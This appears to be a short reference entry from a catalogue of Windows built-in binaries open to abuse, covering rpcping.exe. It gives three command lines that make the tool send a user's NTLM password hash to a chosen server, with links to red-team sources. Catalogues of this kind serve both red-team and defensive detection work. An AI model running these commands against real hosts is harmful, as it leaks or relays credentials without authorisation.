## Rpcping.exe
* Functions: Credentials
```

rpcping -s 127.0.0.1 -t ncacn_np
Send a RPC test connection to the target server (-s) sending the password hash in the process.

rpcping -s 192.168.1.10 -ncacn_np
Send a RPC test connection to the target server (-s) sending the password hash in the process.

rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.
```
   
* Resources:   
  * https://twitter.com/subtee/status/872797890539913216
  * https://github.com/vysec/RedTips
  * https://twitter.com/vysecurity/status/974806438316072960
  * https://twitter.com/vysecurity/status/873181705024266241
   
* Full path:   
  * C:\Windows\System32\rpcping.exe
  * C:\Windows\SysWOW64\rpcping.exe
   
* Notes: Thanks to Casey Smith - @subtee, Vincent Yiu - @vysecurity  
   
